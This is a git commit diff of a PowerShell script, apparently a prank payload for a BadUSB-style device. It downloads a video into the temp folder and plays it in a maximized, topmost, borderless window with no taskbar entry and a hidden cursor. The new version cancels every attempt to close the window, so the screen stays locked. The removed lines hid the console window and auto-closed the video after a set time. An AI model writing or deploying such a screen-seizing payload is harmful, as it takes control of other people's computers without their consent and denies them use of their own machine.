8537a09286aa40d4e07c03c2fb65870a6f35e5e8
ymkeee <forfunpaychilled@gmail.com>
2026-03-17 22:08:41 +0300

    Update play_video.ps1

--- play_video.ps1
+++ play_video.ps1
@@ -1,20 +1,14 @@
-try {
-    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
-    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
-    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
-} catch {}
-
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase
 
-$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
-$f = "$env:TEMP\payload_video.mp4"
-$videoDuration = 15 # Укажи здесь длительность видео в секундах
+$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/assets/edit.mp4'
+$f = "$env:TEMP\$([Guid]::NewGuid()).mp4"
 
 try {
-    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop
+    Invoke-WebRequest -Uri $u -OutFile $f
+} catch { exit }
 
-    $xaml = @"
+[xml]$xaml = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         WindowStyle="None" WindowState="Maximized" Topmost="True" 
         Background="Black" Cursor="None" ShowInTaskbar="False">
@@ -22,27 +16,13 @@ try {
 </Window>
 "@
 
-    $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
-    $w = [Windows.Markup.XamlReader]::Load($reader)
-    $v = $w.FindName("v")
+$reader = New-Object System.Xml.XmlNodeReader $xaml
+$w = [Windows.Markup.XamlReader]::Load($reader)
+$v = $w.FindName("v")
+$v.add_MediaEnded({ $w.Close() })
+$w.Add_Closing({ $_.Cancel = $true })
 
-    # 1. Попытка закрыть по окончании видео
-    $v.add_MediaEnded({ $w.Close() })
-    
-    # 2. Гарантированное закрытие по таймеру (через $videoDuration сек)
-    $timer = New-Object System.Windows.Threading.DispatcherTimer
-    $timer.Interval = [TimeSpan]::FromSeconds($videoDuration)
-    $timer.Add_Tick({ 
-        $w.Close()
-        $timer.Stop()
-    })
-    $timer.Start()
+$w.ShowDialog() | Out-Null
 
-    # УБРАЛИ блокировку Closing, чтобы окно могло закрыться само!
-    $w.ShowDialog() | Out-Null
-} 
-catch { exit }
-finally {
-    # Убиваем процесс, если он вдруг завис
-    Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
-}
+Start-Sleep -Seconds 1
+if (Test-Path $f) { Remove-Item -Path $f -Force }
